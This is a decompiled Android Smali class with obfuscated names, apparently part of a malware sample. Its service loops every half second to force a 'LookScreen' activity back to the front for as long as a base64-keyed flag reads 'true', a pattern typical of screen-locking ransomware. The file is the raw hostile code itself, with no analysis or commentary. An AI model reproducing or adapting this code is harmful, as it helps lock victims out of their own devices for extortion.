.class public Lnaqsl/ebxcb/exu/ServiceLookScreen;
.super Landroid/app/IntentService;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;

.field ifdf:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    const-string v0, "ServiceLookScreen"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceLookScreen;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceLookScreen;->ifdf:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 4

    :catch_0
    :cond_0
    const-wide/16 v0, 0x1f4

    :try_start_2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_5} :catch_5

    :catch_5
    :try_start_5
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lnaqsl/ebxcb/exu/Activity/LookScreen;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceLookScreen;->fddo:Lnaqsl/ebxcb/exu/int;

    const-string v0, "bG9va3NjcmVlbg=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p0, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "true"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_2b
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_2b} :catch_0

    if-nez p1, :cond_0

    return-void
.end method
